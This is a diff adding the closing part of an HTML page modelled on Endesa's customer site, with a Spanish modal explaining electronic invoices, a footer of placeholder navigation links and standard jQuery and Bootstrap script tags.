+		<dialog id="digitalBillInfoWFD" data-configmodal="9" class="CM-modal_init mod_modal modal_dialog active_box neutralBG5">
+		<div class="eInvoice_state activeBoxV vent_Modal mod_info_box mod_info_content boxed propiedadCSS3">
+			<div class="mod_cols mod_colsW100">
+				<div class="mod_cols_top mod_cols_top_border">
+					<h4 class="textBig">
+						<span class="bold">¿Qué es</span>
+						la factura electrónica?
+					</h4>
+				</div>
+				<div class="MarginTop1em scroll-pane height400 boxed">
+					<p>La factura electrónica recoge los mismos datos que la factura que recibes en papel y la puedes visualizar con la misma apariencia, además incluye una firma electrónica que te garantiza la autenticidad del emisor y la integridad de su contenido.</p>
+				</div>
+				<div class="col colPaddingRight0">
+					<a class="CM-modal_close textSmaller buttonContrast buttonContrastSinFlecha azul" href="javascript:void(0);" onclick="closeModal('digitalBillInfoWFD')" title="cerrar">cerrar</a>
+				</div>
+			</div>
+		</div>
+		</dialog>
+	</section>
+    </div>
+                        </div>
+	                </div>
+	                </div>
+	            </section>
+                    <!--Llamada Modelo347-->
+				 <footer class="pie mod_footer">
+	<div class="mod_footer_top lista_desplegable_b">
+		<div class="wrapper">
+		    <div class="footer_line">
+	        	<a class="textSmall arrow" href="#" title="Volver Arriba">
+	        		<span class="arrowUp"></span>Volver Arriba
+	        	</a>
+	<!-- Obtenemos el id de la home -->
+						<ul class="line">		
+				<li class="line_column">
+					<h4 class="textSmall bold gris3">Conócenos</h4>
+					<ul class="footer_lnk_block level2">
+												<li>
+													<a class="textSmall" href="#" title="Conoce Endesa">Conoce Endesa</a>
+												</li>
+												<li>
+													<a class="textSmall" href="#" title="Nuestra historia">Nuestra historia</a>
+												</li>
+					</ul>
+				</li>
+				<li class="line_column">
+					<h4 class="textSmall bold gris3">Acceso</h4>
+					<ul class="footer_lnk_block level2">
+												<li>
+													<a class="textSmall" href="#" title="Acceso con DNI electrónico">Acceso con DNI electrónico</a>
+												</li>
+					</ul>
+				</li>
+				<li class="line_column">
+					<h4 class="textSmall bold gris3">Nuestro Blog</h4>
+					<ul class="footer_lnk_block level2">
+												<li>
+													<a class="textSmall" href="#" title="Últimos artículos">Últimos artículos</a>
+												</li>
+												<li>
+													<a class="textSmall" href="#" title="Promociones y ganadores">Promociones y ganadores</a>
+												</li>
+					</ul>
+				</li>
+						</ul>
+						<ul class="line">		
+				<li class="line_column">
+					<h4 class="textSmall bold gris3">Consulta nuestras FAQs</h4>
+					<ul class="footer_lnk_block level2">
+												<li>
+													<a class="textSmall" href="#" title="Preguntas frecuentes">Preguntas frecuentes</a>
+												</li>
+					</ul>
+				</li>
+				<li class="line_column">
+					<h4 class="textSmall bold gris3">Nuestro compromiso</h4>
+					<ul class="footer_lnk_block level2">
+												<li>
+													<a class="textSmall" href="#" title="Carta de servicio AENOR">Carta de servicio AENOR</a>
+												</li>
+					</ul>
+				</li>
+				<li class="line_column">
+					<h4 class="textSmall bold gris3">Nuestras APPs</h4>
+					<ul class="footer_lnk_block level2">
+												<li>
+													<a class="textSmall" href="#" title="App Endesa Clientes">App Endesa Clientes</a>
+												</li>
+												<li>
+													<a class="textSmall" href="#" title="Descarga software visor">Descarga software visor</a>
+												</li>
+					</ul>
+				</li>
+						</ul>
+			</div>
+			<div class="footer_column">
+    <ul class="footerDrops">
+        <li class="navigator_menu">
+                    <!-- inicio cambio accesibilidad -->
+                    <ul class="footer_lnk_block">
+                        <li class="dropdown">
+                            <a href="#" class="textSmall bold desplegable CM_acceso_footer">
+                                Endesa en el mundo
+                            </a>
+                            <ul class="dropdown_container CM_acceso_footer accessible outH">
+                            <!-- fincambio accesibilidad -->
+                                        <li>
+	        <a class="textSmaller" href="#" title="Ir a Alemania" onclick="" target="_top">
+				Alemania
+			</a>
+                                        </li>
+                                        <li>
+	        <a class="textSmaller" href="#" title="Ir a Benelux" onclick="" target="_top">
+				Benelux
+			</a>
+                                        </li>
+                                        <li>
+	        <a class="textSmaller" href="#" title="Ir a Francia" onclick="" target="_top">
+				Francia
+			</a>
+                                        </li>
+                                        <li>
+	        <a class="textSmaller" href="#" title="Ir a Portugal" onclick="" target="_top">
+				Portugal
+			</a>
+                                        </li>
+                            </ul>
+                        </li>
+                    </ul>
+                    <!-- inicio cambio accesibilidad -->
+                    <ul class="footer_lnk_block">
+                        <li class="dropdown">
+                            <a href="#" class="textSmall bold desplegable CM_acceso_footer">
+                                Sitios Endesa
+                            </a>
+                            <ul class="dropdown_container CM_acceso_footer accessible outH">
+                            <!-- fincambio accesibilidad -->
+                                        <li>
+	        <a class="textSmaller" href="#" title="Ir a Soluciones Integrales" onclick="" target="_top">
+				Soluciones Integrales
+			</a>
+                                        </li>
+                                        <li>
+	        <a class="textSmaller" href="#" title="Ir a Endesa" onclick="" target="_top">
+				Endesa
+			</a>
+                                        </li>
+                                        <li>
+	        <a class="textSmaller" href="#" title="Ir a Twenergy" onclick="" target="_top">
+				Twenergy
+			</a>
+                                        </li>
+                                        <li>
+	        <a class="textSmaller" href="#" title="Ir a Vehículo eléctrico" onclick="" target="_top">
+				Vehículo eléctrico
+			</a>
+                                        </li>
+                                        <li>
+	        <a class="textSmaller" href="#" title="Ir a Infoenergía" onclick="" target="_top">
+				Infoenergía
+			</a>
+                                        </li>
+                                        <li>
+	        <a class="textSmaller" href="#" title="Ir a Liga Endesa" onclick="" target="_top">
+				Liga Endesa
+			</a>
+                                        </li>
+                            </ul>
+                        </li>
+                    </ul>
+       </li>
+       <li class="ban">
+	<a href="#" target="_self" title="Sello Premio CRC">
+	</a>
+       </li>
+    </ul>
+		    </div>
+		</div>
+	</div>
+	<div class="mod_footer_bottom">
+	    <div class="wrapper">
+	        <div class="subpie">
+		<div class="textSmaller semiBold subpiendesa">
+		     Endesa S.A. <span class="bold">2018</span>
+		</div>
+		<!-- Obtenemos el id de la home -->
+	    <div class="subpienel">
+			<ul>               
+						<li>
+							<a class="textSmaller" href="#" title="Conoce la energía">Conoce la energía</a>
+						</li> 
+						<li>
+							<span class="footerSeparator"> - </span>							
+							<a class="textSmaller" href="#" title="Mapa del sitio">Mapa del sitio</a>
+						</li> 
+						<li>
+							<span class="footerSeparator"> - </span>							
+							<a class="textSmaller" href="#" title="Seguridad">Seguridad</a>
+						</li> 
+						<li>
+							<span class="footerSeparator"> - </span>							
+							<a class="textSmaller" href="#" title="Accesibilidad">Accesibilidad</a>
+						</li> 
+						<li>
+							<span class="footerSeparator"> - </span>							
+							<a class="textSmaller" href="#" title="Aviso Legal">Aviso Legal</a>
+						</li> 
+						<li>
+							<span class="footerSeparator"> - </span>							
+							<a class="textSmaller" href="#" title="Cookies en Endesa">Cookies en Endesa</a>
+						</li>
+				<li>
+	            	<a class="textSmaller grupoEnel" href="#" title="Grupo Enel">
+	            		Grupo Enel
+	            	</a>
+	        	</li>
+			</ul>
+		</div>
+	        </div>
+	    </div>
+	</div>
+		</footer>
+			</div>
+<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+    <script src="./src/bootstrap.min.js"></script>
+</body>
+</html>
